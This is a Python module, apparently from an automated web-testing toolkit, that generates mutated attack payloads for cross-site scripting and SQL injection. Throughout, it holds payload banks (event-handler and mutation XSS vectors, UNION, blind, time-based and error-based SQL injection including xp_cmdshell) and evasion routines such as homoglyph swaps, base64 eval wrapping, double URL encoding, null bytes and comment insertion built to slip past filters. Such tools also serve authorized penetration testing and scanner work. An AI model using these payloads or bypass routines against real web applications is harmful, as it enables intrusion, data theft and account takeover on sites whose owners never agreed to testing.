"""
PayloadMutator — shared bypass library for all harnesses.

Provides common encoding/obfuscation mutations plus vuln-specific variants.
Every harness can import this instead of maintaining its own bypass logic.

Usage:
    from agents.payload_mutator import PayloadMutator

    pm = PayloadMutator()
    variants = pm.generate_mutations("<script>alert(1)</script>", vuln_type="xss", count=15)
    sqli_variants = pm.generate_mutations("' OR 1=1--", vuln_type="sqli", count=10)
"""

from __future__ import annotations

import base64
import codecs
import random
import re
import string
import urllib.parse
from itertools import islice
from typing import Callable

# ──────────────────────────────────────────────────────────────────────────────
# Unicode homoglyph tables
# ──────────────────────────────────────────────────────────────────────────────

# Map ASCII → look-alike Unicode codepoints
_HOMOGLYPHS: dict[str, list[str]] = {
    "a": ["\u0430", "\u0251", "\uFF41"],          # Cyrillic а, Latin ɑ, fullwidth a
    "e": ["\u0435", "\u0454", "\uFF45"],          # Cyrillic е, Ukrainian є, fullwidth e
    "i": ["\u0456", "\u04CF", "\uFF49"],          # Cyrillic і, ӏ, fullwidth i
    "o": ["\u043E", "\u0585", "\uFF4F"],          # Cyrillic о, Armenian օ, fullwidth o
    "p": ["\u0440", "\uFF50"],                    # Cyrillic р, fullwidth p
    "c": ["\u0441", "\uFF43"],                    # Cyrillic с, fullwidth c
    "s": ["\u0455", "\uFF53"],                    # Cyrillic ѕ, fullwidth s
    "x": ["\u0445", "\uFF58"],                    # Cyrillic х, fullwidth x
    "<": ["\uFF1C", "\u2039"],                    # fullwidth <, single angle ‹
    ">": ["\uFF1E", "\u203A"],                    # fullwidth >, single angle ›
    "(": ["\uFF08"],
    ")": ["\uFF09"],
    "/": ["\u2215", "\uFF0F"],                    # division slash, fullwidth /
    "=": ["\uFF1D"],
    "'": ["\u2018", "\u2019", "\u02BC"],
    '"': ["\u201C", "\u201D", "\uFF02"],
}

# Invisible / zero-width characters that can be inserted between letters
_ZERO_WIDTH = [
    "\u200B",  # zero-width space
    "\u200C",  # zero-width non-joiner
    "\u200D",  # zero-width joiner
    "\u2060",  # word joiner
    "\uFEFF",  # BOM / zero-width no-break space
]


# ──────────────────────────────────────────────────────────────────────────────
# XSS payload banks
# ──────────────────────────────────────────────────────────────────────────────

_XSS_HTML_CONTEXTS = [
    '<img src=x onerror="{payload}">',
    '<svg onload="{payload}">',
    '<details open ontoggle="{payload}">',
    '<body onload="{payload}">',
    '<input autofocus onfocus="{payload}">',
    '<video src=x onerror="{payload}">',
    '<audio src=x onerror="{payload}">',
    '<iframe onload="{payload}">',
    '<marquee onstart="{payload}">',
    '<div style="width:expression({payload})">',   # IE CSS expression
]

_XSS_SCRIPT_CONTEXTS = [
    '<script>{payload}</script>',
    '</script><script>{payload}</script>',
    '";{payload};//',
    "';{payload};//",
    "`}};{payload};//",
]

_XSS_URL_CONTEXTS = [
    'javascript:{payload}',
    'data:text/html,<script>{payload}</script>',
    'data:text/html;base64,{b64}',  # special: b64 = base64("<script>{payload}</script>")
]

_XSS_DOM_SINKS = [
    "document.write('{payload}')",
    "document.getElementById('x').innerHTML='{payload}'",
    "eval('{payload}')",
    "setTimeout('{payload}',0)",
    "location.href='javascript:{payload}'",
]

_XSS_SCRIPTLESS = [
    '<svg><animate onbegin="{payload}" attributeName=x dur=1>',
    '<form><button formaction="javascript:{payload}">click',
    '<object data="javascript:{payload}">',
    '<link rel=stylesheet href="data:text/css,*{{{{x:expression({payload})}}}}">',
    '<base href="javascript:/{payload}//">',
    '<math><mtext></form><form><mglyph><svg><mtext></mglyph><img src onerror={payload}>',
]

_MXSS_PATTERNS = [
    # Mutation XSS — browsers re-parse these unexpectedly
    '<!--<img src="--><img src=x onerror={payload}>">',
    '<listing><img src="</listing><img src=x onerror={payload}>">',
    '<noscript><p title="</noscript><img src=x onerror={payload}>">',
    '<svg><![CDATA[</svg><img src=x onerror={payload}>]]>',
    '<math><mi//xlink:href="javascript:{payload}">',
    '<table><td background="javascript:{payload}">',
]

# ──────────────────────────────────────────────────────────────────────────────
# SQLi payload banks
# ──────────────────────────────────────────────────────────────────────────────

_SQLI_UNION_TEMPLATES = [
    "' UNION SELECT {cols}--",
    "' UNION ALL SELECT {cols}--",
    "' UNION SELECT {cols}#",
    "1 UNION SELECT {cols}--",
    "') UNION SELECT {cols}--",
    "' UNION SELECT {cols} LIMIT 1--",
]

_SQLI_BOOLEAN_TEMPLATES = [
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR 1=1--",
    "' OR '1'='1",
    "' OR 'x'='x",
    "1' AND SLEEP(0)--",
    "') AND ('1'='1",
    "1 AND 1=1",
    "1 AND 1=2",
]

_SQLI_TIME_TEMPLATES = [
    "'; WAITFOR DELAY '0:0:{n}'--",        # MSSQL
    "'; SELECT SLEEP({n})--",              # MySQL
    "'; SELECT pg_sleep({n})--",           # Postgres
    "' OR SLEEP({n})--",
    "1 AND SLEEP({n})",
    "'; EXEC xp_cmdshell('ping -n {n} 127.0.0.1')--",
    "1) OR SLEEP({n})--",
]

_SQLI_ERROR_TEMPLATES = [
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",
    "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' OR 1 GROUP BY CONCAT((SELECT version()),FLOOR(RAND(0)*2)) HAVING MIN(0)--",
    "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",  # MSSQL
    "' AND 1=(SELECT 1/0 FROM dual)--",    # Oracle
    "' AND ctxsys.drithsx.sn(user,(SELECT table_name FROM all_tables WHERE rownum=1))=1--",
]


# ──────────────────────────────────────────────────────────────────────────────
# Main class
# ──────────────────────────────────────────────────────────────────────────────

class PayloadMutator:
    """
    Generic payload mutator with common bypass techniques and vuln-specific mutations.

    All harnesses should import this class rather than reimplementing bypasses.
    """

    # ── Common encoding mutations ────────────────────────────────────────────

    def mutate_base64(self, payload: str) -> str:
        """Wrap payload in a base64 atob() eval construct."""
        b64 = base64.b64encode(payload.encode()).decode()
        return f"eval(atob('{b64}'))"

    def mutate_unicode(self, payload: str) -> str:
        """Replace a few lowercase ASCII chars with Unicode homoglyphs."""
        out = []
        for ch in payload:
            if ch in _HOMOGLYPHS and random.random() < 0.35:
                out.append(random.choice(_HOMOGLYPHS[ch]))
            else:
                out.append(ch)
        return "".join(out)

    def mutate_encoding_hex(self, payload: str) -> str:
        """Hex-encode every character as \\xNN escape sequences."""
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def mutate_rot13(self, payload: str) -> str:
        """ROT13 the alphabetic characters (rarely useful but included for completeness)."""
        return codecs.encode(payload, "rot_13")

    def mutate_null_bytes(self, payload: str) -> str:
        """Insert null bytes at potential truncation points."""
        # Insert %00 after every 8th character
        parts = [payload[i:i+8] for i in range(0, len(payload), 8)]
        return "%00".join(parts)

    def mutate_case_swap(self, payload: str) -> str:
        """Randomly swap case of alphabetic characters."""
        return "".join(
            c.upper() if (c.isalpha() and random.random() > 0.5) else c
            for c in payload
        )

    def mutate_comment_insertion(self, payload: str) -> str:
        """Insert SQL/JS block comments between characters of keywords."""
        # Insert /**/ between every pair of chars in known keywords
        keywords = ["alert", "script", "onerror", "onload", "select", "union", "sleep", "eval"]
        result = payload
        for kw in keywords:
            if kw in result.lower():
                # Randomise comment insertion in one keyword occurrence
                idx = result.lower().find(kw)
                original = result[idx: idx + len(kw)]
                mutated = "/**/".join(list(original))
                result = result[:idx] + mutated + result[idx + len(kw):]
        return result

    def mutate_whitespace_variation(self, payload: str) -> str:
        """Replace spaces with various whitespace equivalents."""
        ws_variants = ["\t", "\n", "\r", "\x0b", "\x0c", "\u00a0", "\u2000", "\u2003"]
        return "".join(
            random.choice(ws_variants) if c == " " else c
            for c in payload
        )

    def mutate_double_encoding(self, payload: str) -> str:
        """URL-encode, then URL-encode again (double encoding)."""
        single = urllib.parse.quote(payload, safe="")
        return urllib.parse.quote(single, safe="")

    def mutate_nested_escaping(self, payload: str) -> str:
        """Apply multiple layers of escaping to confuse nested parsers."""
        # Layer 1: HTML entity encode < > " '
        step1 = (
            payload
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace('"', "&quot;")
            .replace("'", "&#x27;")
        )
        # Layer 2: URL-encode the HTML entities
        return urllib.parse.quote(step1, safe="&;#")

    # ── XSS-specific mutations ───────────────────────────────────────────────

    def mutate_xss_html_context(self, payload: str) -> list[str]:
        """Generate XSS payloads suitable for HTML tag/attribute contexts."""
        variants = []
        for tpl in _XSS_HTML_CONTEXTS:
            variants.append(tpl.format(payload=payload))
        # Also wrap raw payload in common tags
        variants += [
            f"<img src=x onerror={payload}>",
            f"<svg/onload={payload}>",
            f"<body/onload={payload}>",
            f"<details/open/ontoggle={payload}>",
        ]
        return variants

    def mutate_xss_script_context(self, payload: str) -> list[str]:
        """Generate XSS payloads for script/JS string context breakouts."""
        variants = []
        for tpl in _XSS_SCRIPT_CONTEXTS:
            variants.append(tpl.format(payload=payload))
        # String terminators
        for terminator in ["'", '"', "`"]:
            variants.append(f"{terminator};{payload};//")
            variants.append(f"{terminator}+{payload}+{terminator}")
        return variants

    def mutate_xss_url_context(self, payload: str) -> list[str]:
        """Generate XSS payloads for URL/href attribute contexts."""
        b64 = base64.b64encode(f"<script>{payload}</script>".encode()).decode()
        variants = []
        for tpl in _XSS_URL_CONTEXTS:
            if "{b64}" in tpl:
                variants.append(tpl.format(b64=b64, payload=payload))
            else:
                variants.append(tpl.format(payload=payload))
        variants += [
            f"javascript:void({payload})",
            f"javascript:/*--></title></style></textarea></script></xmp>"
            f"<svg/onload='+/\"/+/onmouseover=1/+/[{payload}]//'>",
        ]
        return variants

    def mutate_xss_dom_context(self, payload: str) -> list[str]:
        """Generate XSS payloads targeting DOM sinks (innerHTML, eval, etc.)."""
        variants = []
        for tpl in _XSS_DOM_SINKS:
            variants.append(tpl.format(payload=payload))
        # Scriptless vectors and mXSS
        for tpl in _XSS_SCRIPTLESS:
            variants.append(tpl.format(payload=payload))
        for tpl in _MXSS_PATTERNS:
            variants.append(tpl.format(payload=payload))
        return variants

    def mutate_xss_event_handlers(self, payload: str) -> list[str]:
        """Return event-handler-based XSS vectors."""
        handlers = [
            "onerror", "onload", "onmouseover", "onfocus", "onblur",
            "onclick", "ondblclick", "onkeydown", "onkeyup", "onkeypress",
            "onmouseenter", "onmouseleave", "onpointerover", "ontouchstart",
            "onanimationstart", "ontransitionend", "onbeforeinput",
        ]
        tags_with_src = ["img", "video", "audio", "iframe", "source"]
        tags_no_src = ["div", "span", "p", "a", "button", "form", "section"]
        variants = []
        for handler in handlers:
            tag = random.choice(tags_with_src)
            variants.append(f"<{tag} src=x {handler}={payload}>")
            tag2 = random.choice(tags_no_src)
            variants.append(f"<{tag2} {handler}={payload}>")
        return variants

    # ── SQLi-specific mutations ──────────────────────────────────────────────

    def mutate_sqli_union(self, payload: str, col_count: int = 3) -> list[str]:
        """Generate UNION-based SQLi variants."""
        nulls = ", ".join(["NULL"] * col_count)
        cols_str_first = ", ".join(
            ["@@version"] + ["NULL"] * (col_count - 1)
        )
        variants = []
        for tpl in _SQLI_UNION_TEMPLATES:
            variants.append(tpl.format(cols=nulls))
            variants.append(tpl.format(cols=cols_str_first))
        # Append the custom payload too
        variants.append(payload)
        # Comment variations
        for comment in ["--", "#", "-- -", "/*", "--+"]:
            variants.append(f"' UNION SELECT {nulls}{comment}")
        return variants

    def mutate_sqli_boolean(self, payload: str) -> list[str]:
        """Generate boolean-based blind SQLi variants."""
        variants = list(_SQLI_BOOLEAN_TEMPLATES)
        # Custom payload variations
        for comment in ["--", "#", "-- -"]:
            variants.append(f"{payload}{comment}")
        # AND/OR true/false pairs
        for cond_true, cond_false in [("1=1", "1=2"), ("'a'='a'", "'a'='b'"), ("2>1", "1>2")]:
            variants.append(f"' AND {cond_true}--")
            variants.append(f"' AND {cond_false}--")
        return variants

    def mutate_sqli_time_based(self, payload: str, delay: int = 5) -> list[str]:
        """Generate time-based blind SQLi variants."""
        variants = []
        for tpl in _SQLI_TIME_TEMPLATES:
            variants.append(tpl.format(n=delay))
        variants.append(payload)
        return variants

    def mutate_sqli_error_based(self, payload: str) -> list[str]:
        """Generate error-based SQLi variants."""
        variants = list(_SQLI_ERROR_TEMPLATES)
        variants.append(payload)
        return variants

    # ── Universal mutation pipeline ──────────────────────────────────────────

    def _common_mutations(self, payload: str) -> list[str]:
        """Apply all generic bypass techniques and return a list of variants."""
        return [
            self.mutate_case_swap(payload),
            self.mutate_comment_insertion(payload),
            self.mutate_whitespace_variation(payload),
            self.mutate_double_encoding(payload),
            self.mutate_null_bytes(payload),
            self.mutate_unicode(payload),
            self.mutate_encoding_hex(payload),
            self.mutate_base64(payload),
            self.mutate_rot13(payload),
            self.mutate_nested_escaping(payload),
        ]

    def generate_mutations(
        self,
        payload: str,
        vuln_type: str = "xss",
        count: int = 10,
        include_base: bool = True,
    ) -> list[str]:
        """
        Generate up to `count` unique mutations of `payload` for `vuln_type`.

        vuln_type: one of "xss", "sqli", "generic"
        Returns a deduplicated list (preserving insertion order).
        """
        candidates: list[str] = []

        if include_base:
            candidates.append(payload)

        # Common bypass techniques
        candidates.extend(self._common_mutations(payload))

        # Vuln-specific
        vt = vuln_type.lower()
        if vt == "xss":
            candidates.extend(self.mutate_xss_html_context(payload))
            candidates.extend(self.mutate_xss_script_context(payload))
            candidates.extend(self.mutate_xss_url_context(payload))
            candidates.extend(self.mutate_xss_dom_context(payload))
            candidates.extend(self.mutate_xss_event_handlers(payload))
        elif vt == "sqli":
            candidates.extend(self.mutate_sqli_union(payload))
            candidates.extend(self.mutate_sqli_boolean(payload))
            candidates.extend(self.mutate_sqli_time_based(payload))
            candidates.extend(self.mutate_sqli_error_based(payload))
        # "generic" → only common mutations

        # Deduplicate while preserving order
        seen: set[str] = set()
        unique: list[str] = []
        for c in candidates:
            if c not in seen:
                seen.add(c)
                unique.append(c)

        return unique[:count]

    # ── Convenience wrappers ─────────────────────────────────────────────────

    def xss_variants(self, payload: str, count: int = 20) -> list[str]:
        """Shorthand: generate XSS mutations."""
        return self.generate_mutations(payload, vuln_type="xss", count=count)

    def sqli_variants(self, payload: str, count: int = 20) -> list[str]:
        """Shorthand: generate SQLi mutations."""
        return self.generate_mutations(payload, vuln_type="sqli", count=count)

    def encode_all(self, payload: str) -> dict[str, str]:
        """Return a dict of all encoding variants (useful for manual testing)."""
        return {
            "original":         payload,
            "url_encoded":      urllib.parse.quote(payload),
            "double_encoded":   self.mutate_double_encoding(payload),
            "base64_eval":      self.mutate_base64(payload),
            "hex_escaped":      self.mutate_encoding_hex(payload),
            "null_bytes":       self.mutate_null_bytes(payload),
            "case_swapped":     self.mutate_case_swap(payload),
            "comment_inserted": self.mutate_comment_insertion(payload),
            "whitespace_var":   self.mutate_whitespace_variation(payload),
            "unicode":          self.mutate_unicode(payload),
            "rot13":            self.mutate_rot13(payload),
            "nested_escaped":   self.mutate_nested_escaping(payload),
        }


# ──────────────────────────────────────────────────────────────────────────────
# Module-level singleton (import convenience)
# ──────────────────────────────────────────────────────────────────────────────

_default_mutator = PayloadMutator()

def generate_mutations(payload: str, vuln_type: str = "xss", count: int = 10) -> list[str]:
    """Module-level convenience wrapper around PayloadMutator.generate_mutations."""
    return _default_mutator.generate_mutations(payload, vuln_type=vuln_type, count=count)


# ──────────────────────────────────────────────────────────────────────────────
# CLI demo
# ──────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="PayloadMutator demo / quick test")
    parser.add_argument("payload", nargs="?", default="<script>alert(1)</script>")
    parser.add_argument("--type", default="xss", choices=["xss", "sqli", "generic"])
    parser.add_argument("--count", type=int, default=15)
    parser.add_argument("--all-encodings", action="store_true")
    args = parser.parse_args()

    pm = PayloadMutator()

    if args.all_encodings:
        print(f"\n=== All encodings for: {args.payload} ===\n")
        for name, val in pm.encode_all(args.payload).items():
            print(f"  {name:<20} {val}")
    else:
        print(f"\n=== {args.count} {args.type.upper()} mutations for: {args.payload} ===\n")
        for i, variant in enumerate(pm.generate_mutations(args.payload, args.type, args.count), 1):
            print(f"  {i:>3}. {variant}")
    print()
